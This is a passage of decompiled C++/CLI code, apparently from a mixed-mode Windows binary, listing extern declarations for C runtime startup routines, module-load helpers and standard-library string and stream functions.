    if ((UIntPtr) *(int*) ((IntPtr) obj0 + 4) >= (UIntPtr) (*(int*) (*(int*) obj0 + 20) * 2) + (UIntPtr) \u003CModule\u003E.std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E_Myptr((basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E*) *(int*) obj0))
    {
      \u003CModule\u003E._invalid_parameter_noinfo();
      goto label_7;
    }
    else
      goto label_7;
  }

  [SuppressUnmanagedCodeSecurity]
  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  public static extern uint _WinMainCRTStartup();

  [SuppressUnmanagedCodeSecurity]
  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void* _getFiberPtrId();

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern void _amsg_exit([In] int obj0);

  [SuppressUnmanagedCodeSecurity]
  [MethodImpl(MethodImplOptions.Unmanaged | MethodImplOptions.PreserveSig, MethodCodeType = MethodCodeType.Native)]
  public static extern void __security_init_cookie();

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern void Sleep([In] uint obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern void \u003CCrtImplementationDetails\u003E\u002EThrowModuleLoadException(
    [In] string obj0,
    [In] Exception obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern void \u003CCrtImplementationDetails\u003E\u002EThrowModuleLoadException(
    [In] string obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern void \u003CCrtImplementationDetails\u003E\u002EDoDllLanguageSupportValidation();

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern void \u003CCrtImplementationDetails\u003E\u002EThrowNestedModuleLoadException(
    [In] Exception obj0,
    [In] Exception obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern void \u003CCrtImplementationDetails\u003E\u002ERegisterModuleUninitializer(
    [In] EventHandler obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void \u003CCrtImplementationDetails\u003E\u002EDoCallBackInDefaultDomain(
    [In] __FnPtr<int (void*)> obj0,
    [In] void* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern void _cexit();

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern void terminate();

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(
    [In] basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj0,
    [In] basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bdtor\u007D(
    [In] basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe sbyte* std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ec_str(
    [In] basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void* @new([In] uint obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void delete([In] void* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void delete\u005B\u005D([In] void* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe exception* std\u002Eexception\u002E\u007Bctor\u007D(
    [In] exception* obj0,
    [In] exception* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void std\u002Eexception\u002E\u007Bdtor\u007D([In] exception* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void* _encode_pointer([In] void* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void* _decode_pointer([In] void* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void* _encoded_null();

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int __FrameUnwindFilter([In] _EXCEPTION_POINTERS* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe uint std\u002Echar_traits\u003Cchar\u003E\u002Elength([In] sbyte* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe sbyte std\u002Echar_traits\u003Cchar\u003E\u002Eto_char_type([In] int* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.Cdecl, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  [return: MarshalAs(UnmanagedType.U1)]
  public static extern unsafe bool std\u002Echar_traits\u003Cchar\u003E\u002Eeq_int_type(
    [In] int* obj0,
    [In] int* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  [return: MarshalAs(UnmanagedType.U1)]
  public static extern unsafe bool std\u002Eios_base\u002Egood([In] ios_base* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int std\u002Eios_base\u002Eflags([In] ios_base* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int std\u002Eios_base\u002Ewidth([In] ios_base* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe int std\u002Eios_base\u002Ewidth([In] ios_base* obj0, [In] int obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void std\u002Ebasic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(
    [In] basic_stringstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void std\u002Ebasic_ifstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(
    [In] basic_ifstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void std\u002Ebasic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E\u002E__vbaseDtor(
    [In] basic_ofstream\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u0020\u003E* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(
    [In] basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u007Bctor\u007D(
    [In] basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj0,
    [In] sbyte* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002E\u003D(
    [In] basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj0,
    [In] basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe _String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Eerase(
    [In] basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj0,
    [In] _String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj1,
    [In] _String_const_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E obj2,
    [In] _String_const_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E obj3);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe _String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Ebegin(
    [In] basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj0,
    [In] _String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe _String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Eend(
    [In] basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj0,
    [In] _String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe reverse_iterator\u003Cstd\u003A\u003A_String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u0020\u003E* std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Erbegin(
    [In] basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj0,
    [In] reverse_iterator\u003Cstd\u003A\u003A_String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u0020\u003E* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe reverse_iterator\u003Cstd\u003A\u003A_String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u0020\u003E* std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Erend(
    [In] basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj0,
    [In] reverse_iterator\u003Cstd\u003A\u003A_String_iterator\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u0020\u003E* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe uint std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Efind_last_of(
    [In] basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj0,
    [In] sbyte* obj1,
    [In] uint obj2);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* std\u002Ebasic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E\u002Esubstr(
    [In] basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj0,
    [In] basic_string\u003Cchar\u002Cstd\u003A\u003Achar_traits\u003Cchar\u003E\u002Cstd\u003A\u003Aallocator\u003Cchar\u003E\u0020\u003E* obj1,
    [In] uint obj2,
    [In] uint obj3);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bctor\u007D(
    [In] basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bctor\u007D(
    [In] basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0,
    [In] char* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bctor\u007D(
    [In] basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0,
    [In] basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe void std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u007Bdtor\u007D(
    [In] basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u003D(
    [In] basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0,
    [In] basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002E\u003D(
    [In] basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0,
    [In] char* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
  public static extern unsafe _String_iterator\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* std\u002Ebasic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E\u002Ebegin(
    [In] basic_string\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj0,
    [In] _String_iterator\u003Cwchar_t\u002Cstd\u003A\u003Achar_traits\u003Cwchar_t\u003E\u002Cstd\u003A\u003Aallocator\u003Cwchar_t\u003E\u0020\u003E* obj1);

  [SuppressUnmanagedCodeSecurity]
  [DllImport("", EntryPoint = "", CallingConvention = CallingConvention.ThisCall, SetLastError = true)]
  [MethodImpl(MethodImplOptions.Unmanaged, MethodCodeType = MethodCodeType.Native)]
